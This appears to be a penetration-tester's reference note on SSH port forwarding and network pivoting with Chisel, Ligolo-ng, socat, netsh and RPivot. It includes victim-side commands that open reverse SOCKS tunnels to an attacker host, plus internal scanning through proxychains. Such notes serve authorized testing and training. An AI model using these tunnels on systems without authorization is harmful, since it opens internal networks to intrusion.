---
tags: [reference, ssh, tunneling, pivoting, port-forward]
---

# SSH Tunneling

## Local Port Forwarding

Expose a remote service on a local port.

```bash
# Access remote service locally
ssh -L <local-port>:<remote-host>:<remote-port> <user>@<jump-host>

# Example: access internal web app on port 80 via jump host
ssh -L 8080:192.168.1.100:80 user@10.10.10.5
# Then: curl http://localhost:8080

# Background / no shell
ssh -L 8080:192.168.1.100:80 -N -f user@10.10.10.5

# Through a jump host (ProxyJump)
ssh -J user@jump-host -L 8080:internal:80 user@internal
```

## Remote Port Forwarding

Expose a local service on the remote host.

```bash
# Expose local port on remote server
ssh -R <remote-port>:<local-host>:<local-port> user@<remote>

# Example: expose attacker's listener to victim network
ssh -R 8080:127.0.0.1:80 -N user@victim
# Now victim can reach attacker's port 80 via localhost:8080
```

## Dynamic Port Forwarding (SOCKS Proxy)

Route all traffic through a SOCKS5 proxy via SSH.

```bash
ssh -D 1080 -N -f user@<jump-host>

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -p 22,80,443 192.168.1.0/24
proxychains curl http://192.168.1.100/
proxychains netexec smb 192.168.1.0/24

# Use with curl
curl --socks5 127.0.0.1:1080 http://192.168.1.100/
```

## SSH Config for Persistent Pivots

```bash
# ~/.ssh/config
Host jump
  HostName 10.10.10.5
  User user
  IdentityFile ~/.ssh/id_rsa
  DynamicForward 1080    # SOCKS proxy on connect

Host internal
  HostName 192.168.1.100
  User user
  ProxyJump jump
```

## Chisel Pivoting

```bash
# Attacker (server)
./chisel server -p 8888 --reverse --socks5

# Victim (client) — SOCKS tunnel back to attacker
./chisel client <attacker-ip>:8888 R:socks

# Victim (client) — single port forward
./chisel client <attacker-ip>:8888 R:1234:127.0.0.1:3306

# Then on attacker:
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap ...
```

## Ligolo-ng Pivoting

```bash
# Attacker: start proxy (listen for agent)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim: connect agent
./agent -connect <attacker>:11601 -ignore-cert

# In ligolo-ng proxy console:
session        # select session
ifconfig       # view victim interfaces
start          # start tunnel

# Add route on attacker for internal subnet
sudo ip route add 192.168.1.0/24 dev ligolo
```

## Socat Port Forwarding

```bash
# Forward port (TCP relay)
socat TCP-LISTEN:<local-port>,fork TCP:<remote-host>:<remote-port>

# Example: relay attacker's 4444 to internal 4444
socat TCP-LISTEN:4444,fork TCP:192.168.1.100:4444

# UDP forward
socat UDP-LISTEN:161,fork UDP:192.168.1.100:161
```

## Netsh (Windows)

```powershell
# Port forwarding (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100

# List
netsh interface portproxy show all

# Delete
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Open firewall
netsh advfirewall firewall add rule name="Pivot" dir=in action=allow protocol=TCP localport=8080
```

## RPivot (HTTP Tunneling)

```bash
# Attacker
python3 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080

# Victim
python3 client.py --server-ip <attacker> --server-port 9999

# proxychains via SOCKS4 127.0.0.1:1080
```

## Related

- [[06-Lateral-Movement/INDEX]] — Full pivoting playbook
- [[00-Quick-Reference/Reverse-Shells]] — Shell handlers on pivot
